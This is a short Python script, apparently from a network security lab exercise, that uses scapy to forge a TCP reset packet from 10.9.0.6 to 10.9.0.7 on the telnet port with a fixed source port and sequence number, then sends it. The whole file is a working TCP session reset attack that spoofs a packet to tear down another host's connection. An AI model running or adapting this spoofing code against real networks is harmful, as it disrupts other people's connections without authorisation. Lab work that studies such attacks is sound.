#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.7")
tcp = TCP(sport=40212, dport=23, flags="R", seq=698127306, ack=698127306)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)
